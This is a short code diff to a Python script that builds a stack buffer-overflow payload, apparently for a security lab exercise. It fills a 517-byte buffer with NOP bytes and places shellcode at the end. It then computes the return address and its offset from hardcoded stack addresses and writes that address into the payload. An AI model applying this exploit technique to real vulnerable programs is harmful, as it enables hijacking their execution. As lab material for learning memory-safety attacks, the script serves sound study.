@@ -24,10 +24,13 @@ content = bytearray(0x90 for i in range(517))
 start = 517 - len(shellcode)        # put the shellcode at the end of content
 content[start:start + len(shellcode)] = shellcode
 
+bof = 0xffffcfe8
+buffer = 0xffffcf74
+
 # Decide the return address value
 # and put it somewhere in the payload
-ret    = 0xffffcf74 + 517 - len(shellcode)  # the value of ret is the address of buffer plus the offset of shellcode in the content
-offset = 0x74 + 4       # the value of offset is the address of ebp minus the address of buffer plus 4
+ret    = buffer + 517 - len(shellcode)  # the value of ret is the address of buffer plus the offset of shellcode in the content
+offset = bof - buffer + 4       # the value of offset is the address of ebp minus the address of buffer plus 4
 
 L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
 content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
